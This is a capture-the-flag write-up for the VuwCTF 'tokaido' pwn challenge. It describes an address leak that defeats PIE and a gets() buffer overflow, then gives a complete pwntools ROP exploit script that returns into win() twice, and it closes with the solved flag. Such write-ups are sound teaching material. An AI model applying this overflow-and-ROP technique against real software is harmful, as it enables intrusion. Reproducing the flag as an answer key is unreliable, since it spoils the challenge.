pwn
## 1. Analysis

We are provided with a 64-bit ELF binary `tokaido` and its source code `tokaido.c`.

### Source Code Review

The `main` function contains two critical elements:

1. **Memory Leak:** It prints the address of the `main` function itself (`printf("funny number: %p\n", main);`). This allows us to bypass ASLR/PIE protections.
    

- **Buffer Overflow:** It uses `gets(buffer)` to read into a 16-byte buffer. Since `gets` does not check input length, we can overwrite the stack.
    

The `win` function has a specific logic gate:

C

```
void win() {
    puts("you win");
    if (attempts++ > 0){
        // prints flag...
    } else {
        puts("not attempted");
    }
}
```

The flag is only printed if `attempts > 0`. Since `attempts` starts at 0, calling `win()` once is insufficient. We must execute `win()` **twice** within the same exploit chain.

## 2. Exploitation Strategy

To exploit this, we use a **Return-Oriented Programming (ROP)** approach:

1. **Calculate Offsets:** We determine the static distance between `main` and `win` in the binary.
    
    - Static `main`: `0x12ce`
        
    - Static `win`: `0x1229`
        
2. **Bypass ASLR:** Capture the "funny number" leak at runtime, calculate the binary's base address, and determine the dynamic address of `win`.
    
3. **Construct Payload:**
    
    - **Padding:** 16 bytes (Buffer) + 8 bytes (Saved RBP) = **24 bytes**.
        
    - **Return Address 1:** Address of `win` (Increments `attempts` to 1).
        
    - **Return Address 2:** Address of `win` (Checks `attempts > 0` and prints flag).
        

## 3. Exploit Script

Here is the final python script using `pwntools` to solve the challenge remotely.

Python

```
from pwn import *

# Context setup
exe = './tokaido'
elf = ELF(exe)
context.binary = elf

# Connect to server
# r = process(exe) # For local testing
r = remote("tokaido.challenges.2025.vuwctf.com", 9983)

# 1. Parse the Leak
r.recvuntil(b"funny number: ")
leak = int(r.recvline().strip(), 16)
log.info(f"Leaked main: {hex(leak)}")

# 2. Calculate Base Address
# Formula: Base = Leak - Static_Main_Offset
elf.address = leak - elf.symbols['main']
log.success(f"Calculated Binary Base: {hex(elf.address)}")

# 3. Construct Payload
# We need to call win() TWICE.
# Layout: [Padding 24B] + [Address of Win] + [Address of Win]
payload = b"A" * 24
payload += p64(elf.symbols['win']) # First call: attempts -> 1
payload += p64(elf.symbols['win']) # Second call: prints flag

# 4. Send & Win
r.sendline(payload)
r.interactive()
```

## 4. Flag

`VuwCTF{eastern_sea_route}`